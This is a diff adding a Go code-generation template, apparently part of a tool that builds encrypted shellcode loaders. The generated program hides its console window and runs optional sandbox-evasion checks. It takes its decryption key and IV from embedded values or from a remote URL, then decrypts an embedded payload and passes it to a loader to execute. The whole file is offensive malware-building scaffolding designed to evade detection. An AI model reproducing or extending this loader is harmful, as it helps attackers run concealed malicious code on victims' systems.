@@ -1,0 +1,81 @@
+package main
+
+import (
+    {{if .Compressor}}
+        "{{.Compressor.Import}}"
+    {{end}}
+	"variant/crypto"
+
+	{{if .Dynamic}}
+         "{{.Dynamic.Import}}"
+    {{end}}
+
+	"variant/loader"
+	{{if .SandBox}}
+	    "{{.SandBox.Import}}"
+	{{end}}
+)
+
+func init() {
+	loader.HideConsoleWin()
+
+	{{if .SandBox}}
+        {{range .SandBox.Methods}}
+            {{.}}
+	    {{end}}
+	{{end}}
+}
+
+func main() {
+
+
+
+
+    // 是否为本地加载模式
+    {{if .Local}}
+         // 本地加载, 如有存在 Local.KeyName 则渲染
+        {{if .Local.KeyName}}
+	        {{.Local.KeyName}} := []byte("{{.Local.KeyValue}}")
+        {{end}}
+
+    // 是否为动态 Key
+	{{else if .Dynamic}}
+        {{.Dynamic.DynamicKey}} := {{.Dynamic.DynamicMethod}}("{{.Dynamic.DynamicUrl}}",{{.Dynamic.KeyStart}},{{.Dynamic.KeyEnd}})
+	{{end}}
+
+    // Key 是否需要解压
+	{{if .Compressor}}
+	    {{- .KeyName}}, _ = {{.Compressor.Algorithm}}({{.KeyName}}, {{.Compressor.Ratio}})
+    {{end}}
+
+    // 是否为本地加载模式
+    {{if .Local}}
+        // 本地加载, 如有存在 Local.KeyName 则渲染
+        {{if .Local.IvName}}
+            {{.Local.IvName}}  := []byte("{{.Local.IvValue}}")
+                {{if .Compressor}}
+                {{.Local.IvName}}, _ = {{.Compressor.Algorithm}}({{.Local.IvName}}, {{.Compressor.Ratio}})
+                {{end}}
+        {{end}}
+	{{else if .Dynamic}}
+        {{.Dynamic.DynamicIV}} := {{.Dynamic.DynamicMethod}}("{{.Dynamic.DynamicUrl}}",{{.Dynamic.IVStart}},{{.Dynamic.IVEnd}})
+	{{end}}
+
+	{{if .Compressor}}
+    	{{.CipherText}}, _ = {{.Compressor.Algorithm}}("{{.Payload}}", {{.Compressor.Ratio}})
+    {{else}}
+        {{.CipherText}} := "{{.Payload}}"
+    {{end}}
+
+    {{if .Local}}
+        {{if .Local.KeyName}}
+	        {{.PlainText}}, _ := crypto.{{.Decrypt}}({{.CipherText}}, {{.Local.KeyName}} {{if .Local.IvName}}, {{.Local.IvName}}{{end}})
+        {{end}}
+
+	{{else if .Dynamic}}
+	    {{.PlainText}}, _ := crypto.{{.Decrypt}}({{.CipherText}}, {{.Dynamic.DynamicKey}} {{if .Dynamic.DynamicIV}}, {{.Dynamic.DynamicIV}} {{end}})
+    {{end}}
+
+
+	loader.{{.Loader}}({{.PlainText}})
+}
